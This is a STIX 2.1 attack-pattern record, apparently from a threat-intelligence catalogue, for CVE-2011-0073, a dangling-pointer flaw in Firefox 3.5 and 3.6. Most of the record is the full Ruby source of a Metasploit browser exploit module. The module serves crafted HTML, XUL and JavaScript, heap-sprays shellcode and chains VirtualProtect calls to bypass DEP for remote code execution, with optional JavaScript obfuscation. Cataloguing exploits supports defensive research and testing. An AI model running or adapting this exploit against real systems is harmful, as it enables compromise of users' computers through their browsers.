{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--60ccb85f-7713-4818-955d-a74eea4ef4cf",
    "created": "2024-08-14T16:44:45.747277Z",
    "modified": "2024-08-14T16:44:45.747281Z",
    "name": "Mozilla Firefox \"nsTreeRange\" Dangling Pointer Vulnerability",
    "description": " This module exploits a code execution vulnerability in Mozilla Firefox 3.6.x <= 3.6.16 and 3.5.x <= 3.5.17 found in nsTreeSelection. By overwriting a subfunction of invalidateSelection it is possible to free the nsTreeRange object that the function currently operates on. Any further operations on the freed object can result in remote code execution. Utilizing the call setup the function provides it's possible to bypass DEP without the need for a ROP. Sadly this exploit is still either dependent on Java or bound by ASLR because Firefox doesn't employ any ASLR-free modules anymore.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mozilla_nstreerange.rb",
            "external_id": "mozilla_nstreerange.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0073"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=630919"
        },
        {
            "source_name": "reference",
            "url": "http://www.mozilla.org/security/announce/2011/mfsa2011-13.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  include Msf::Exploit::Remote::BrowserAutopwn\n  autopwn_info({\n    :ua_name => HttpClients::FF,\n    :ua_minver => \"3.5\",\n    :ua_maxver => \"3.6.16\",\n    :os_name => OperatingSystems::Match::WINDOWS,\n    :javascript => true,\n    :rank => NormalRanking,\n    :vuln_test => \"if (navigator.userAgent.indexOf('Windows NT 5.1') != -1 || navigator.javaEnabled()) { is_vuln = true; }\",\n  })\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Mozilla Firefox \"nsTreeRange\" Dangling Pointer Vulnerability',\n      'Description'    => %q{\n        This module exploits a code execution vulnerability in Mozilla Firefox\n        3.6.x <= 3.6.16 and 3.5.x <= 3.5.17 found in nsTreeSelection.\n        By overwriting a subfunction of invalidateSelection it is possible to free the\n        nsTreeRange object that the function currently operates on.\n        Any further operations on the freed object can result in remote code execution.\n        Utilizing the call setup the function provides it's possible to bypass DEP\n        without the need for a ROP. Sadly this exploit is still either dependent\n        on Java or bound by ASLR because Firefox doesn't employ any ASLR-free\n        modules anymore.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'regenrecht', # discovered and sold to ZDI\n          'xero', # Shenanigans\n        ],\n      'References'     =>\n        [\n          ['CVE',    '2011-0073'],\n          ['OSVDB',  '72087'],\n          ['BID',    '47663'],\n          ['ZDI',    '11-157'],\n          ['URL',    'https://bugzilla.mozilla.org/show_bug.cgi?id=630919'],\n          ['URL',    'http://www.mozilla.org/security/announce/2011/mfsa2011-13.html']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread', # graceful exit if run in separate thread\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 0x1000, # depending on the spray size it's actually a lot more\n        },\n      'Platform'       => %w{ win },\n      'Targets'        =>\n        [\n          [ 'Auto (Direct attack against Windows XP, otherwise through Java, if enabled)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n              'Auto' => true,\n              'Targets' => [['navigator.userAgent.indexOf(\"Windows NT 5.1\") != -1', 1],\n                ['navigator.javaEnabled()', 2]],\n              'UsesJava' => true\n            }\n          ],\n          [ 'Firefox Runtime, fails with ASLR',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n              'VPOffset' => 0x781A91F8, # VirtualProtect\n              'LLOffset' => 0x781A9104, # LoadLibraryA\n              'GPAOffset' => 0x781A9014, # GetProcAddress\n              'UsesJava' => false\n            }\n          ],\n          [ 'Java Runtime (7.10.3052.4), best against ASLR',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n              'VPOffset' => 0x7C37A140,\n              'LLOffset' => 0x7C37A0B8,\n              'GPAOffset' => 0x7C37A00C,\n              'UsesJava' => true\n            }\n          ],\n          [ 'Java JVM (20.1.0.02)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n              'VPOffset' => 0x6D9FC094,\n              'LLOffset' => 0x6D9FC110,\n              'GPAOffset' => 0x6D9FC188,\n              'UsesJava' => true\n            }\n          ],\n          [ 'Java Regutils (6.0.260.3)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n              'VPOffset' => 0x6D6C227C,\n              'LLOffset' => 0x6D6C2198,\n              'GPAOffset' => 0x6D6C2184,\n              'UsesJava' => true\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-02-02'\n      ))\n\n    register_options(\n      [\n        OptBool.new('SEHProlog', [ true, 'Whether to prepend the payload with an SEH prolog, to catch crashes and enable a silent exit', true]),\n        OptBool.new('CreateThread', [ true, 'Whether to execute the payload in a new thread', true]),\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', true]),\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptInt.new('BaseOffset', [ true, 'The offset we hope to have overwritten with our heap spray', 0x0F000000 ]),\n        OptInt.new('SpraySize', [ true, 'The size of our heapspray blocks', 0x100000 ]),\n        OptInt.new('SprayCount', [ true, 'Number of blocks to be sprayed', 200 ]),\n        OptBool.new('SetBP', [ true, 'Set a breakpoint before payload execution', false ]),\n        OptBool.new('Crash', [ true, 'Usa an invalid offset to make the exploit crash (for debugging)', false ]),\n      ], self.class\n    )\n  end\n\n  def prepare_payload(target, p)\n    base_offset = (datastore['Crash'] != true) ? datastore['BaseOffset'] : 1\n    spray_size = datastore['SpraySize']\n\n    esp_fix = 0\n    callchain = []\n\n    # Adding calls by hand is tedious, look at the bottom for an explanation of these values\n    add_call = Proc.new { |offset, arg1, arg2, direct |\n      next_offset = base_offset + (callchain.flatten.length*4)\n      callchain[-1][2] = next_offset if callchain.length > 0 # connect new frame to last one\n\n      if direct\n        callchain <<\n        [\n          next_offset + 0x4 - 8,\n          next_offset + 0x14,\n          0,\n          arg1,\n          arg2,\n          next_offset + 0x18 - 0x70,\n          offset\n        ]\n      else\n        callchain <<\n        [\n          next_offset + 0x4 - 8,\n          next_offset + 0x14,\n          0,\n          arg1,\n          arg2,\n          offset - 0x70\n        ]\n      end\n    }\n\n    add_call.call(target['LLOffset'], base_offset, 0) # use dummy LoadLibrary call to push valid fourth VirtualProtect argument on stack\n    add_call.call(target['VPOffset'], 0x10000, 0x40) # call VirtualProtect to make heap executable\n    add_call.call(0xDEADBEEF, 0, 0, true) # call our shellcode\n\n    callchain.flatten!\n    callchain[-1] = base_offset + (callchain.length*4) # patch last offset to point to shellcode located after callchain\n\n    esp_fix = 0x10\n\n    payload_buf = callchain.pack('V*')\n\n    payload_buf << \"\\xCC\" if datastore['SetBP']\n\n    # make rest of shellcode run in separate thread\n    if datastore['CreateThread'] and target['LLOffset'] and target['GPAOffset']\n      payload_buf << \"\\x60\\x31\\xc0\\x50\\x50\\x50\\xe8\\x00\\x00\\x00\\x00\\x5a\\x89\\xd6\"\n      payload_buf << \"\\x52\\x83\\x04\\x24\\x3b\\x83\\xc2\\x25\\x83\\xc6\\x2e\\x50\\x50\\x56\"\n      payload_buf << \"\\x52\\xff\\x15#{[target['LLOffset']].pack('V')}\\x50\\xff\\x15#{[target['GPAOffset']].pack('V')}\"\n      payload_buf << \"\\xff\\xd0\\x61\\xc2#{[esp_fix].pack('v')}\\x6b\\x65\\x72\\x6e\\x65\\x6c\\x33\\x32\"\n      payload_buf << \"\\x00\\x43\\x72\\x65\\x61\\x74\\x65\\x54\\x68\\x72\\x65\\x61\\x64\\x00\"\n\n      esp_fix = 0\n    end\n\n    # encapsulate actual payload in SEH handler\n    if datastore['SEHProlog']\n      payload_buf << \"\\x60\\xe8\\x00\\x00\\x00\\x00\\x83\\x04\\x24\\x1a\\x64\\xff\\x35\\x00\"\n      payload_buf << \"\\x00\\x00\\x00\\x64\\x89\\x25\\x00\\x00\\x00\\x00\\x81\\xec\\x00\\x01\"\n      payload_buf << \"\\x00\\x00\\xeb\\x12\\x8b\\x64\\x24\\x08\\x64\\x8f\\x05\\x00\\x00\\x00\"\n      payload_buf << \"\\x00\\x83\\xc4\\x04\\x61\\xc2\"\n      payload_buf << [esp_fix].pack('v')\n    end\n\n    payload_buf << p\n\n    # controlled crash, to return to our SEH handler\n    payload_buf << \"\\x33\\xC0\\xFF\\xE0\" if datastore['SEHProlog']\n\n    payload_buf\n  end\n\n  def on_request_uri(cli, request)\n\n    if request.uri == get_resource() or request.uri =~ /\\/$/\n      print_status(\"Redirecting to .html URL\")\n      redir = get_resource()\n      redir << '/' if redir[-1,1] != '/'\n      redir << rand_text_alphanumeric(4+rand(4))\n      redir << '.html'\n      send_redirect(cli, redir)\n\n    elsif request.uri =~ /\\.html?$/\n      print_status(\"Sending HTML\")\n      xul_name  \t= rand_text_alpha(rand(100)+1)\n      j_applet \t= rand_text_alpha(rand(100)+1)\n\n      html = <<-EOS\n<html>\n#{\"<applet codebase=\\\".\\\" code=\\\"#{j_applet}.class\\\" width=0 height=0></applet>\" if target['UsesJava']}\n<iframe src=\"#{xul_name}.xul\" width=\"1\" height=\"1\" frameborder=\"0\"></iframe>\n</html>\nEOS\n      send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    elsif request.uri =~ /\\.xul$/\n      print_status(\"Sending XUL\")\n\n      js_file  = rand_text_alpha(rand(100)+1)\n      @js_func = rand_text_alpha(rand(32)+1)\n\n      xul = <<-EOS\n<?xml version=\"1.0\"?>\n<?xml-stylesheet type=\"text/css\"?>\n<window xmlns:html=\"http://www.w3.org/1999/xhtml\" xmlns=\"http://www.mozilla.org/keymaster/gatekeeper/there.is.only.xul\" onload=\"#{@js_func}()\">\n<script src=\"#{js_file}.js\"/>\n<tree id=\"tr\">\n  <treechildren>\n    <treeitem>\n      <treerow>\n        <treecell label=\"\"/>\n      </treerow>\n    </treeitem>\n  </treechildren>\n</tree>\n</window>\nEOS\n      send_response(cli, xul, { 'Content-Type' => 'application/vnd.mozilla.xul+xml' })\n\n    elsif request.uri =~ /\\.js$/\n      print_status(\"Sending JS\")\n      return if ((p = regenerate_payload(cli).encoded) == nil)\n\n      base_offset = (datastore['Crash'] != true) ? datastore['BaseOffset'] : 1\n      spray_size = datastore['SpraySize']\n      spray_count = datastore['SprayCount']\n\n      if not target['Auto']\n        escaped_payload = Rex::Text.to_unescape(prepare_payload(target, p))\n        shellcode_str = \"var shellcode = unescape(\\\"#{escaped_payload}\\\");\"\n      else\n        shellcode_str = target['Targets'].map{ |check, index|\n          \"if (#{check}) {\\n var shellcode = unescape(\\\"#{Rex::Text.to_unescape(prepare_payload(targets[index], p))}\\\");\\n }\"}.join(' else ')\n        shellcode_str << \" else { return; }\"\n      end\n\n      escaped_addr = Rex::Text.to_unescape([base_offset].pack(\"V\"))\n\n      custom_js = <<-EOS\nfunction #{@js_func}() {\n\n  container = new Array();\n\n  #{shellcode_str}\n\n  var delimiter = unescape(\"%udead\");\n\n  var block = unescape(\"#{escaped_addr}\");\n  while (block.length < 8)\n    block += block;\n\n  var treeSel = document.getElementById(\"tr\").view.selection;\n\n  treeSel.clearSelection();\n\n  for (var count = 0; count < 30; ++count)\n    container.push(block + delimiter);\n\n  treeSel.select(0);\n\n  treeSel.tree = {\n    invalidateRange: function(s,e) {\n\n      treeSel.tree = null;\n      treeSel.clearSelection();\n\n      for (var count = 0; count < 10; ++count)\n        container.push(block + delimiter);\n\n      var big = unescape(\"%u4558%u4f52\");\n      while (big.length < #{spray_size / 2})\n        big += big;\n\n      var pad = big.substring(0, #{(base_offset % spray_size)/2}) + shellcode;\n      var spray = pad + big.substring(pad.length + 2);\n\n      for (var count = 0; count < #{spray_count}; ++count)\n        container.push(spray + delimiter);\n    }\n  }\n\n  treeSel.invalidateSelection();\n}\nEOS\n\n      if datastore['OBFUSCATE']\n        opts = {\n          'Symbols' => {\n            'Variables' => %w{ shellcode container delimiter block treeSel big pad spray count }\n          }\n        }\n\n        custom_js = obfuscate_js(custom_js,opts)\n      end\n\n      send_response(cli, custom_js, { 'Content-Type' => 'application/x-javascript' })\n    end\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n\n=begin\n\nESI points to shellcode\n\nfinal call looks like this: CALL [[[[ESI]+8]]+70]\n[ESI+10], [ESI+C] and [[ESI]+8] are pushed as arguments\n[ESI+8] points to the next call frame, if there is one\n\n104924BC  /$  56            PUSH ESI\n104924BD  |.  8B7424 08     MOV ESI,DWORD PTR SS:[ESP+8]\n104924C1  |>  8B06          /MOV EAX,DWORD PTR DS:[ESI]\n104924C3  |.  8B40 08       |MOV EAX,DWORD PTR DS:[EAX+8]\n104924C6  |.  85C0          |TEST EAX,EAX\n104924C8  |.  74 0C         |JE SHORT xul.104924D6\n104924CA  |.  FF76 10       |PUSH DWORD PTR DS:[ESI+10]\n104924CD  |.  8B08          |MOV ECX,DWORD PTR DS:[EAX]\n104924CF  |.  FF76 0C       |PUSH DWORD PTR DS:[ESI+C]\n104924D2  |.  50            |PUSH EAX\n104924D3  |.  FF51 70       |CALL DWORD PTR DS:[ECX+70] # does the calling for us\n104924D6  |>  8B76 08       |MOV ESI,DWORD PTR DS:[ESI+8]\n104924D9  |.  85F6          |TEST ESI,ESI\n104924DB  |.^ 75 E4         \\JNZ SHORT xul.104924C1\n104924DD  |.  5E            POP ESI\n104924DE  \\.  C2 0400       RETN 4\n=end\n",
    "x_mitre_disclosure_date": "2011-02-02",
    "x_mitre_platforms": [
        "win'"
    ]
}